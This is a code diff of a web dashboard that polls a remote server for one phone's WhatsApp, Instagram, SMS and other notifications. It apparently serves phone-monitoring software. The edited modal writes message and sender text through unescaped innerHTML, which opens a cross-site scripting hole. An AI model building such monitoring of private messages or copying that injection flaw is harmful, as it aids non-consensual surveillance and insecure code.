@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Notifications - Admin Panel</title>
+    <title>Live Notifications</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
@@ -19,7 +19,7 @@
             background-color: var(--bg-color);
             background-image: linear-gradient(45deg, #000000, #1a1a1a);
             color: var(--text-main);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', sans-serif;
             margin: 0; padding: 20px;
             min-height: 100vh; display: flex; justify-content: center;
         }
@@ -94,13 +94,16 @@
         <div class="header">
             <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
             <div class="title"><i class="fa-regular fa-bell"></i> Notifications</div>
-            <div style="width: 40px;"></div>
+            
+            <button onclick="fetchNotifications()" class="back-btn" style="border:none; cursor:pointer;">
+                <i class="fa-solid fa-rotate-right"></i>
+            </button>
         </div>
 
         <div id="notif-list" class="notif-list">
             <div class="empty-state">
                 <i class="fa-solid fa-circle-notch fa-spin"></i>
-                <p>Syncing Notifications...</p>
+                <p>Connecting to Phone...</p>
             </div>
         </div>
     </div>
@@ -117,27 +120,30 @@
     </div>
 
     <script>
-        // --- 🛑 SETTINGS 🛑 ---
-        // Yahan sahi ID daal di hai maine:
+        // ✅ 1. Correct Server URL Fix
+        const RENDER_URL = "https://child-v9no.onrender.com";
         const DEVICE_ID = "M2103K19I"; 
-        
-        // Agar Render par hi site kholi hai to ye sahi hai.
-        // Agar GitHub Pages use kar rahe ho, to yahan Render ka link daalna padega.
-        // Abhi ke liye auto-detect rakha hai:
-        const RENDER_URL = window.location.origin;
 
-        document.addEventListener("DOMContentLoaded", fetchNotifications);
+        document.addEventListener("DOMContentLoaded", () => {
+            fetchNotifications();
+            // ✅ 2. Har 5 Second me Auto-Refresh karega
+            setInterval(fetchNotifications, 5000);
+        });
 
         async function fetchNotifications() {
             const listContainer = document.getElementById("notif-list");
+            
             try {
-                // Correct URL: /api/get-data/ID/notifications
-                const response = await fetch(`${RENDER_URL}/api/get-data/${DEVICE_ID}/notifications`);
+                // ✅ 3. Sahi Path: Server ke uploads folder se 'notifications.json' mangwaya
+                // Note: Hum ?t= time lagate hain taaki browser purana data cache na kare
+                const response = await fetch(`${RENDER_URL}/uploads/notifications.json?t=${new Date().getTime()}`);
                 
-                // Agar 404 ya error aaye
                 if (!response.ok) throw new Error("File not found");
 
                 const data = await response.json();
+                
+                // Agar data naya hai tabhi update kare (Visual flicker rokne ke liye)
+                // Lekin abhi simple rakhte hain, pura list update karenge
                 listContainer.innerHTML = ""; 
 
                 if (!data || data.length === 0) {
@@ -145,24 +151,24 @@
                         <div class="empty-state">
                             <i class="fa-solid fa-bell-slash" style="font-size: 3rem; margin-bottom: 10px;"></i>
                             <p>No Notifications Yet</p>
-                            <small>Wait for phone to send data</small>
                         </div>`;
                     return;
                 }
 
-                // Newest first
-                data.reverse().forEach(notif => {
-                    const appInfo = getAppStyle(notif.package_name);
+                // Newest First (Reverse)
+                // Note: Hum array ko copy karke reverse kar rahe hain taaki original kharab na ho
+                [...data].reverse().forEach(notif => {
+                    const appInfo = getAppStyle(notif.packageName || notif.package_name);
                     
-                    // Time formatting (Agar timestamp hai to convert karo)
-                    let timeStr = notif.time || "";
-                    if(notif.postTime && !isNaN(notif.postTime)) {
+                    // Time setup
+                    let timeStr = "";
+                    if(notif.postTime) {
                         timeStr = new Date(parseInt(notif.postTime)).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
                     }
 
                     const card = document.createElement("div");
                     card.className = "notif-card";
-                    card.onclick = () => openModal(appInfo, notif.title, notif.message);
+                    card.onclick = () => openModal(appInfo, notif.title, notif.text || notif.message);
 
                     card.innerHTML = `
                         <div class="app-icon" style="color: ${appInfo.color}; border: 1px solid ${appInfo.color}40;">
@@ -170,42 +176,57 @@
                         </div>
                         <div class="content">
                             <div class="sender-name">${notif.title || "System"}</div>
-                            <div class="preview-text">${notif.message || "No content"}</div>
+                            <div class="preview-text">${notif.text || notif.message || "No content"}</div>
                         </div>
                         <div class="time-badge">${timeStr}</div>
                     `;
                     listContainer.appendChild(card);
                 });
+
             } catch (err) {
-                console.error(err);
-                // Agar data file nahi bani abhi tak
-                listContainer.innerHTML = `
-                    <div class="empty-state" style="color:#aaaaaa;">
-                        <i class="fa-solid fa-hourglass-half" style="font-size: 2rem; margin-bottom:10px;"></i>
-                        <p>Waiting for data...</p>
-                        <small>Make sure notifications are enabled on phone</small>
-                    </div>`;
+                // Agar file nahi bani (matlab abhi koi notification nahi aayi phone se)
+                console.log("Waiting for data...");
+                // Error user ko dikhane ki zarurat nahi agar bas wait kar rahe hain
+                if(listContainer.innerHTML.includes("Connecting")) {
+                     listContainer.innerHTML = `
+                        <div class="empty-state">
+                            <i class="fa-solid fa-hourglass-half" style="font-size: 2rem; margin-bottom:10px;"></i>
+                            <p>Waiting for Phone Data...</p>
+                            <small>Send a WhatsApp msg to phone to test.</small>
+                        </div>`;
+                }
             }
         }
 
+        // App Icons Logic
         function getAppStyle(pkg) {
             if(!pkg) return { icon: 'fa-solid fa-bell', color: '#ffffff', name: 'System' };
             const p = pkg.toLowerCase();
+            
             if (p.includes("whatsapp")) return { icon: 'fa-brands fa-whatsapp', color: '#25D366', name: 'WhatsApp' };
             if (p.includes("instagram")) return { icon: 'fa-brands fa-instagram', color: '#E1306C', name: 'Instagram' };
             if (p.includes("facebook")) return { icon: 'fa-brands fa-facebook', color: '#1877F2', name: 'Facebook' };
             if (p.includes("snapchat")) return { icon: 'fa-brands fa-snapchat', color: '#FFFC00', name: 'Snapchat' };
             if (p.includes("youtube")) return { icon: 'fa-brands fa-youtube', color: '#FF0000', name: 'YouTube' };
             if (p.includes("telegram")) return { icon: 'fa-brands fa-telegram', color: '#229ED9', name: 'Telegram' };
+            if (p.includes("message") || p.includes("mms")) return { icon: 'fa-solid fa-comment-sms', color: '#4caf50', name: 'SMS' };
+            
             return { icon: 'fa-solid fa-cube', color: '#aaaaaa', name: 'App' };
         }
 
         function openModal(appInfo, sender, message) {
             document.getElementById("modalIcon").innerHTML = `<i class="${appInfo.icon}"></i>`;
             document.getElementById("modalIcon").style.color = appInfo.color;
-            document.getElementById("modalAppName").innerText = appInfo.name + (sender ? ` - ${sender}` : "");
+            document.getElementById("modalAppName").innerText = appInfo.name;
             document.getElementById("modalAppName").style.color = appInfo.color;
-            document.getElementById("modalMessage").innerText = message || "No content";
+            
+            // Message formatting
+            const msgBox = document.getElementById("modalMessage");
+            msgBox.innerHTML = `
+                <strong style="color:white; display:block; margin-bottom:5px;">${sender || ""}</strong>
+                ${message || "No content"}
+            `;
+            
             document.getElementById("detailModal").style.display = "flex";
         }
 
